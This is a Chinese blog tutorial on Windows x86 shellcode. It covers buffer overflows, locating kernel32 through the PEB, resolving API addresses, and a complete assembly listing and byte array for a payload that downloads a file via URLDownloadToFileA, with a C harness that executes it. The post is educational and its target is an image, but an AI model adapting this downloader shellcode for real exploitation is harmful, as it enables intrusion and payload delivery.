---
layout: default
title: 一个可以实现文件下载的shellcode
date: 2017-11-12
categories: shellcode
tags: [缓冲区溢出,shellcode]
description: shellcode其实就是一段二进制代码，用来完成攻击者想要完成的功能。
---

### 0x01 概述
&emsp;&emsp;本文将从缓冲区溢出、函数地址定位、shellcode编码等介绍shellcode的原理，并编写一个可以实现文件下载的shellcode。

### 0x02 缓冲区溢出
&emsp;&emsp;缓冲区是用于数据缓存的连续内存空间。以windows系统为例，windows的内存模型将4G的虚拟内存从低到高依次划分为栈、堆、数据段、代码段、系统DLL加载区、PEB(process environment block)、TEB(thread environment block)等内存区间，其中堆、栈、PEB、TEB都可以存放数据。<br>
&emsp;&emsp;缓冲区溢出的原理就是，在向缓冲区中填充数据的时候，如果数据长度超过缓冲区的容量，数据就会溢出缓冲区，并覆盖合法的数据，从而造成程序异常，甚至可以改变程序出口位置，执行载荷。<br>
&emsp;&emsp;执行shellcode的关键就是找到缓冲区溢出点的精确位置，使有溢出漏洞的程序跳转执行shellcode。一种方法就是用JMP ESP地址来覆盖程序返回地址，将shellcode放在JMP ESP后面，这样程序就会紧跟着执行shellcode。

### 0x03hellcode编写

##### 寻找kernel32的内存地址

    mov eax, fs:0x30; eax = PEB
    mov eax, [eax + 0x0c]; eax = Ldr
    mov esi, [eax + 0x1c];Flink的地址
    lodsd
    mov ebx,[eax+0x08] ebx = kernel32
    

##### 找到引出表

    mov edx, [ebx + 0x3C]
    add edx, ebx;edx=PE头
    mov edx, [edx + 0x78]
    add edx, ebx; edx = 引出表地址
    mov esi, [edx + 0x20]
    add esi, ebx; esi ＝函数名地址，AddressOfName

##### 查找GetProcAddress

    xor ecx,ecx
    search :
    mov eax, [esi + ecx * 4]
    inc ecx
    add eax, ebx; 依次找每个函数名称
    ; GetProcAddress
    cmp dword ptr[eax], 0x50746547; 'PteG'
    jne search
    cmp dword ptr[eax + 4], 0x41636f72; 'Acor'
    jne search; 如果是GetProcA，表示找到了

##### 计算GetProcAddress地址

    mov esi, [edx + 24h]
    add esi, ebx            ; esi = 序号数组地址, AddressOfNameOrdinal
    mov cx, [esi + ecx * 2] ; cx = 计算出的序号值
    dec ecx ;
    mov esi, [edx + 1Ch]
    add esi,ebx; esi＝函数地址的起始位置，AddressOfFunction
    mov edx, [esi + ecx * 4]
    add edx,ebx ;利用序号值，得到出edx=GetProcAddress的地址

##### 调用GetProcAddress查找LoadLibraryA

    xor ecx, ecx
    push ebx; kernal32 基址
    push edx; GetProcAddress地址
    push ecx; 0
    push 0x41797261; Ayra           
    push 0x7262694c; rbiL
    push 0x64616f4c; daoL           
    push esp; "LoadLibrary"
    push ebx; kernal32.dll基址
    call edx

##### 调用LoadLibrary载入urlmon.dll

    add esp,0xc 
    pop ecx
    push eax 
    push ecx
    mov cx,0x6c6c;ll
    push ecx
    push 0x642e6e6f; d.no
    push 0x6d6c7275; mlru
    push esp; "urlmon.dll"
    call eax; LoadLibrary("urlmon.dll")
    add esp, 0x10

##### 调用GetProcAddress查找URLDownloadToFileA地址

    mov edx,[esp+0x4]
    xor ecx, ecx
    push ecx
    mov cx,0x4165;Ae
    push ecx
    push 0x6c69466f; liFo
    push 0x5464616f; Tdao
    push 0x6c6e776f; lnwo
    push 0x444c5255; DLRU
    push esp
    push eax; urlmon.dll地址
    call edx
    add esp,0x14

##### 调用URLDownloadToFileA

    xor edx,edx
    push 0x00000067;g
    push 0x706a2e31; pj.1
    push edx;0
    push 0x66584f58;fXOX
    push 0x31372f6e;17/n
    push 0x632e7a77;c.zw
    push 0x642f2f3a;d//:
    push 0x70747468;ptth
    push edx; 0
    push edx; 0
    mov ecx,esp
    add ecx,0x20
    push ecx
    sub ecx,0x18
    push ecx
    push edx
    call eax;调用URLDownloadToFIle

##### 查找ExitProcess地址

    add esp,0x28
    pop edx;edx=GetProcAddress地址
    pop ebx;ebx=kernel32地址
    push 0x00737365;sse
    push 0x636f7250;corP
    push 0x74697845;tixE
    push esp
    push ebx
    call edx

##### 调用ExitProcess

    xor ecx,ecx
    push ecx;exit_code =0
    call eax

### 0x04编码shellcode

##### 调用反汇编，查看字节码，编写shellcode

    int main(int argc,char *argv[]) {
        unsigned char shellcode[] = { 0x33,0xc9,0x64,0x8b,0x41,0x30,0x8b,0x40,
            0x0c,0x8b,0x70,0x1c,0xad,0x8b,0x58,0x08,0x8b,0x53,0x3c,0x03,0xd3,0x8b,0x52,
            0x78,0x03,0xd3,0x8b,0x72,0x20,0x03,0xf3,0x33,0xc9,0x8b,0x04,0x8e,0x41,0x03,
            0xc3,0x81,0x38,0x47,0x65,0x74,0x50,0x75,0xf2,0x81,0x78,0x04,0x72,0x6f,0x63,
            0x41,0x75,0xe9,0x8b,0x72,0x24,0x03,0xf3,0x66,0x8b,0x0c,0x4e,0x49,0x8b,0x72,
            0x1c,0x03,0xf3,0x8b,0x14,0x8e,0x03,0xd3,0x33,0xc9,0x53,0x52,0x51,0x68,0x61,
            0x72,0x79,0x41,0x68,0x4c,0x69,0x62,0x72,0x68,0x4c,0x6f,0x61,0x64,0x54,0x53,
            0xff,0xd2,0x83,0xc4,0x0c,0x59,0x50,0x51,0x66,0xb9,0x6c,0x6c,0x51,0x68,0x6f,
            0x6e,0x2e,0x64,0x68,0x75,0x72,0x6c,0x6d,0x54,0xff,0xd0,0x83,0xc4,0x10,0x8b,
            0x54,0x24,0x04,0x33,0xc9,0x51,0x66,0xb9,0x65,0x41,0x51,0x68,0x6f,0x46,0x69,
            0x6c,0x68,0x6f,0x61,0x64,0x54,0x68,0x6f,0x77,0x6e,0x6c,0x68,0x55,0x52,0x4c,
            0x44,0x54,0x50,0xff,0xd2,0x83,0xc4,0x14,0x33,0xd2,0x33,0xc9,0xb1,0x67,0x51,0x68,0x31,
            0x2e,0x6a,0x70,0x52,0x68,0x58,0x4f,0x58,0x66,0x68,0x6e,0x2f,0x37,0x31,0x68,
            0x77,0x7a,0x2e,0x63,0x68,0x3a,0x2f,0x2f,0x64,0x68,0x68,0x74,0x74,0x70,0x52,
            0x52,0x8b,0xcc,0x83,0xc1,0x20,0x51,0x83,0xe9,0x18,0x51,0x52,0xff,0xd0,0x83,
            0xc4,0x28,0x5a,0x5b,0x68,0x65,0x73,0x73,0x41,0x83,0x6c,0x24,0x03,0x41,0x68,
            0x50,0x72,0x6f,0x63,0x68,0x45,0x78,0x69,0x74,0x54,0x53,0xff,0xd2,0x33,0xc9,
            0x51,0xff,0xd0};
        ((void(*)())&shellcode)();
    }

### 0x05体会感受

在编写shellcode的过程中遇到了一些困哪，下面和大家分享一下我自己的思考过程。<br>
利用这段代码查看URLDownloadToFile（）函数的地址，但是发现LoadLibrary（）返回的值是正确的，GetProcAddress()返回的值是0x0

    #pragma comment(lib, "urlmon.lib")
    using namespace std;
    #include <windows.h>
    typedef void(*MYPROC)(LPTSTR);
    int main()
    {
        HINSTANCE LibHandle;
        MYPROC ProcAdd;
        LibHandle = LoadLibrary(L"urlmon");
        printf("urlmon LibHandle = 0x%x\n", (UINT)LibHandle);
        ProcAdd = (MYPROC)GetProcAddress(LibHandle, "URLDownloadToFile");
        printf("URLDownloadToFile = 0x%x\n", (UINT)ProcAdd);
        system("pause");
        return 0;
    }
这个现象很奇怪,找到`urlmon.lib`，`GetProcAddress()`应该是顺藤摸瓜就可以找到的，于是调用Visual Studio2015的dumpbin.exe来查看位于`C:\windows\system32\urlmon.dll`
看到`URLDownloadToFile（）`真正的函数名是`URLDownloadToFileW`

![dumpbin.exe](http://101.132.99.228/post_img/shellcode2.png)

于是修改程序，将URLDownloadToFile替换为URLDownloadToFileW,运行程序找到URLDownloadToFile的函数地址：

![URLDownloadToFile](http://101.132.99.228/post_img/shellcode3.png)
 
我从网上选择了一幅图片，他的URL为：

    https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1510942227806&di=bc61b3af2dd36bb5c383c7da2e812323&imgtype=0&src=http%3A%2F%2Fupload.71.cn%2F2015%2F0228%2F1425112319616.jpg
利用百度短网址工具转换成短网址，缩短shellcode长度

    http://dwz.cn/71XOXf
然后开始编写汇编源代码，将URLDownloadToFile函数的依次参数压入堆栈中。
在调用URLDownloadToFileA的过程中，我先是直接将参数字符串从后至前压入栈中，发现这种方法不行。于是找了很多资料，也查看了源码，正确的调用方法是：

*   先将字符串压入堆栈，调用的时候压入字符串的内存地址，这样才能成功调用。
在编写内联汇编时，不能直接代码中含有0，解决办法是将存储器置零，然后利用存储器传值。

*   还可以先传进去不为零的值，然后减去这个值即可。

最后生成的字节码shellcode，**在Visual Studio2015中不能正常运行，原因是VS2015做了很多优化和限制，不能执行数据段的代码。更换为一个较旧的IDE即可正常运行。**

`((void(*)())&shellcode);`

这段代码的功能是将shellcode转换成无返回值无输入的函数来执行。














